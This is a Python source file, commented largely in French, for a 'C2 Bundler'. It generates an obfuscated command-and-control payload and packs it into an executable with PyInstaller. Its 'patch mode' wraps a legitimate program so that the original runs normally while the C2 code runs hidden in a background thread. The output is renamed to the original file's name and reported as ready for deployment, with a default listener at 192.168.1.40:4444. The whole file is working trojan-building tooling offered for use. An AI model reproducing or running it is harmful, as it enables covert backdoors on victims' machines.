#!/usr/bin/env python3
"""
Complete C2 Bundler - Full Featured
- Payload generation with obfuscation
- PyInstaller bundling
- Cross-platform support (Windows/macOS/Linux)
- Upload support for custom payloads
"""

import os
import sys
import subprocess
import tempfile
import shutil
from pathlib import Path
from typing import Optional


class C2Bundler:
    """Bundler complet avec support upload et personnalisation"""

    def __init__(self):
        self.dist_dir = Path.cwd() / "dist"
        self.dist_dir.mkdir(exist_ok=True)
        self.spec_dir = self.dist_dir / "specs"
        self.spec_dir.mkdir(exist_ok=True)
        self.build_dir = self.dist_dir / "build"
        self.build_dir.mkdir(exist_ok=True)
        self.resources_dir = self.dist_dir / "resources"
        self.resources_dir.mkdir(exist_ok=True)

    def generate_payload(
        self, listener_ip: str, listener_port: int, obfuscation_level: int
    ) -> str:
        """Génère le payload C2 complet"""
        sys.path.insert(0, str(Path(__file__).parent))
        from c2_payload_complete import C2PayloadGenerator

        print(f"[*] Generating C2 payload...")
        print(f"[*] Listener: {listener_ip}:{listener_port}")
        print(f"[*] Obfuscation Level: {obfuscation_level}")

        generator = C2PayloadGenerator(listener_ip, listener_port, obfuscation_level)
        payload_code = generator.generate()
        print(f"[+] Payload generated ({len(payload_code)} bytes)")
        return payload_code

    def save_payload(self, payload_code: str) -> str:
        """Sauvegarde le payload dans un fichier temporaire"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(payload_code)
            temp_file = f.name
        print(f"[+] Temp file: {temp_file}")
        return temp_file

    def bundle_with_pyinstaller(
        self, temp_file: str, platform: str = "windows", add_resources: bool = False
    ) -> bool:
        """Exécute PyInstaller pour créer l'executable"""
        print(f"[*] Running PyInstaller (this may take 30-60 seconds)...")
        print(f"[*] Target platform: {platform}")

        output_name = "c2_payload"
        self._cleanup_previous_bundle(output_name)

        cmd = [
            "pyinstaller",
            "--onefile",
            "-y",
            "--distpath",
            str(self.dist_dir),
            "--specpath",
            str(self.spec_dir),
            "--workpath",
            str(self.build_dir),
            "--name",
            output_name,
        ]

        # Platform-specific options
        if platform == "windows" and sys.platform.startswith("win"):
            cmd.extend(["--windowed"])

        # Add resources folder if patch mode
        if add_resources and self.resources_dir.exists():
            resources_files = list(self.resources_dir.glob("*"))
            if resources_files:
                for res_file in resources_files:
                    if res_file.is_file():
                        cmd.extend(["--add-data", f"{res_file}:resources"])
                        print(f"[*] Adding resource: {res_file.name}")

        cmd.append(temp_file)

        print(f"[*] Command: {' '.join(cmd)}")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            if result.stdout:
                print(f"[*] PyInstaller stdout:\n{result.stdout}")
            if result.stderr:
                print(f"[*] PyInstaller stderr:\n{result.stderr}")

            if result.returncode != 0:
                print(f"[!] PyInstaller failed with return code {result.returncode}")
                # Ne pas supprimer le temp file en cas d'erreur pour debug
                return False

            # Supprimer seulement si succès
            try:
                os.unlink(temp_file)
                print(f"[*] Cleaned up temp file: {temp_file}")
            except:
                pass

            return True

        except subprocess.TimeoutExpired:
            print(f"[!] PyInstaller timeout (300s)")
            return False
        except Exception as e:
            print(f"[!] Error running PyInstaller: {str(e)}")
            import traceback

            print(traceback.format_exc())
            return False

    def verify_executable(self, platform: str = "windows") -> bool:
        """Vérifie que l'executable a été créé correctement"""
        output_name = "c2_payload"

        # Sur macOS, PyInstaller crée un binaire macOS même si on demande Windows
        # Pour Windows, utiliser GitHub Actions
        if platform == "windows":
            # Cherche .exe d'abord (depuis Windows)
            exe_path = self.dist_dir / f"{output_name}.exe"
            if not exe_path.exists():
                # Fallback: cherche binaire macOS (création sur macOS)
                exe_path = self.dist_dir / output_name
        else:
            exe_path = self.dist_dir / output_name

        if exe_path.exists():
            size_mb = exe_path.stat().st_size / 1024 / 1024
            print(f"[+] Executable created: {exe_path}")
            print(f"[+] Size: {size_mb:.2f} MB")
            print(f"[+] C2 payload hidden inside!")

            # Vérifier que c'est un vrai exécutable
            if exe_path.stat().st_mode & 0o111:
                print(f"[+] Status: ✅ READY FOR DEPLOYMENT")
                return True
            else:
                print(f"[!] Not executable (permissions)")
                return False
        else:
            print(f"[!] Executable not found at {exe_path}")
            if self.dist_dir.exists():
                print(f"[!] Contents of dist: {list(self.dist_dir.iterdir())}")
            return False

    def create_patched_payload(
        self,
        listener_ip: str,
        listener_port: int,
        obfuscation_level: int,
        platform: str,
        target_file: str,
    ) -> bool:
        """Crée un payload qui exécute le fichier original + C2 en arrière-plan"""
        try:
            print(f"[*] PATCH MODE: Creating wrapper for {Path(target_file).name}")

            # Vérifier que le fichier existe
            target_path = Path(target_file)
            if not target_path.exists():
                print(f"[!] Target file not found: {target_file}")
                return False

            # Réinitialiser les ressources pour éviter les collisions
            self._reset_resources_dir()

            # Copier le fichier original dans resources
            original_file = self.resources_dir / target_path.name
            print(f"[*] Copying original file to: {original_file}")

            shutil.copy2(target_file, original_file)
            print(
                f"[+] Original file saved ({original_file.stat().st_size / 1024:.2f} KB)"
            )

            # Générer le payload C2
            payload_code = self.generate_payload(
                listener_ip, listener_port, obfuscation_level
            )

            # Créer le wrapper qui lance original + C2
            wrapper_code = self._create_wrapper_code(
                original_file.name, payload_code, platform
            )

            # Sauvegarder le wrapper
            temp_file = self.save_payload(wrapper_code)

            # Bundle avec PyInstaller (avec resources)
            print(f"[*] Bundling patched payload...")
            if not self.bundle_with_pyinstaller(
                temp_file, platform, add_resources=True
            ):
                print("[!] FAILED: PyInstaller bundling failed")
                return False

            # Renommer l'exe final avec le nom original
            output_name = "c2_payload"
            if platform == "windows":
                source = self.dist_dir / f"{output_name}.exe"
                if not source.exists():
                    print(f"[*] No .exe found, checking macOS binary...")
                    source = self.dist_dir / output_name
                dest = self.dist_dir / target_path.name
            else:
                source = self.dist_dir / output_name
                dest = self.dist_dir / target_path.stem

            print(f"[*] Looking for output: {source}")
            print(f"[*] Dist dir contents: {list(self.dist_dir.iterdir())}")

            if source.exists():
                print(f"[+] Found bundled executable: {source}")
                if dest.exists():
                    print(f"[*] Removing existing destination: {dest}")
                    if dest.is_dir():
                        shutil.rmtree(dest)
                    else:
                        dest.unlink()
                print(f"[*] Renaming {source.name} -> {dest.name}")
                source.rename(dest)
                size_mb = dest.stat().st_size / 1024 / 1024
                print(f"[+] Patched executable: {dest}")
                print(f"[+] Size: {size_mb:.2f} MB")
                print(f"[+] Original app will run normally, C2 hidden in background!")
                print(f"[+] Status: ✅ READY FOR DEPLOYMENT")
                return True
            else:
                print(f"[!] Executable not found at: {source}")
                print(f"[!] Expected file does not exist")
                return False

        except Exception as e:
            print(f"[!] FAILED: {str(e)}")
            import traceback

            print(traceback.format_exc())
            return False

    def _cleanup_previous_bundle(self, output_name: str) -> None:
        """Remove previous bundle artifacts so PyInstaller can overwrite."""
        targets = [
            self.dist_dir / output_name,
            self.dist_dir / f"{output_name}.exe",
            self.dist_dir / f"{output_name}.app",
        ]

        for target in targets:
            if target.exists():
                try:
                    if target.is_dir():
                        shutil.rmtree(target)
                    else:
                        target.unlink()
                except Exception as exc:
                    print(f"[!] Warning: failed to remove {target}: {exc}")

    def _reset_resources_dir(self) -> None:
        """Ensure resources directory is clean before copying files."""
        if self.resources_dir.exists():
            for item in self.resources_dir.iterdir():
                try:
                    if item.is_dir():
                        shutil.rmtree(item)
                    else:
                        item.unlink()
                except Exception as exc:
                    print(f"[!] Warning: failed to remove resource {item}: {exc}")
        else:
            self.resources_dir.mkdir(parents=True, exist_ok=True)

    def _create_wrapper_code(
        self, original_filename: str, payload_code: str, platform: str
    ) -> str:
        """Crée le code wrapper qui lance l'original + C2"""

        # Important: Indenter le payload_code correctement pour qu'il soit dans run_c2_payload
        # On ajoute 8 espaces (2 niveaux d'indentation) à chaque ligne du payload
        indented_payload = "\n".join(
            "        " + line if line.strip() else line
            for line in payload_code.strip().split("\n")
        )

        wrapper = f'''import os
import sys
import subprocess
import threading
from pathlib import Path

# Obtenir le répertoire du bundle
if getattr(sys, 'frozen', False):
    bundle_dir = Path(sys._MEIPASS)
else:
    bundle_dir = Path(__file__).parent

# Chemin vers l'application originale
original_app = bundle_dir / "resources" / "{original_filename}"

def run_original_app():
    """Lance l'application originale"""
    try:
        if original_app.exists():
            subprocess.Popen([str(original_app)], shell=False)
    except Exception as e:
        pass

def run_c2_payload():
    """Lance le payload C2 en arrière-plan"""
    try:
        import time
        time.sleep(2)
        # Code C2 ci-dessous
{indented_payload}
    except Exception as e:
        pass

if __name__ == "__main__":
    # Lancer l'app originale dans un thread
    original_thread = threading.Thread(target=run_original_app, daemon=False)
    original_thread.start()
    
    # Lancer le C2 en arrière-plan
    c2_thread = threading.Thread(target=run_c2_payload, daemon=True)
    c2_thread.start()
    
    # Attendre que l'app originale termine
    original_thread.join()
'''

        return wrapper

    def create_bundled_payload(
        self,
        listener_ip: str,
        listener_port: int,
        obfuscation_level: int,
        platform: str = "windows",
        patch_file: Optional[str] = None,
    ) -> bool:
        """Process complet: génération + bundling + vérification"""
        try:
            # Si patch_file est fourni, utiliser le mode patch
            if patch_file:
                return self.create_patched_payload(
                    listener_ip, listener_port, obfuscation_level, platform, patch_file
                )

            # Sinon, mode standalone normal
            # Step 1: Generate payload
            payload_code = self.generate_payload(
                listener_ip, listener_port, obfuscation_level
            )

            # Step 2: Save payload
            temp_file = self.save_payload(payload_code)

            # Step 3: Bundle with PyInstaller
            if not self.bundle_with_pyinstaller(temp_file, platform):
                print("[!] FAILED: PyInstaller bundling failed")
                return False

            # Step 4: Verify executable
            if not self.verify_executable(platform):
                print("[!] FAILED: Executable verification failed")
                return False

            print(f"[+] SUCCESS: C2 payload bundled successfully for {platform}!")
            return True

        except Exception as e:
            print(f"[!] FAILED: {str(e)}")
            import traceback

            print(traceback.format_exc())
            return False


def create_bundled_payload(
    listener_ip: str,
    listener_port: int,
    obfuscation_level: int,
    platform: str = "windows",
    patch_file: Optional[str] = None,
) -> bool:
    """Fonction compatibilité - utilisée par bundler_tab.py et GitHub Actions"""
    bundler = C2Bundler()
    return bundler.create_bundled_payload(
        listener_ip, listener_port, obfuscation_level, platform, patch_file
    )


if __name__ == "__main__":
    # Test avec configuration par défaut
    success = create_bundled_payload("192.168.1.40", 4444, 2, "windows")
    sys.exit(0 if success else 1)
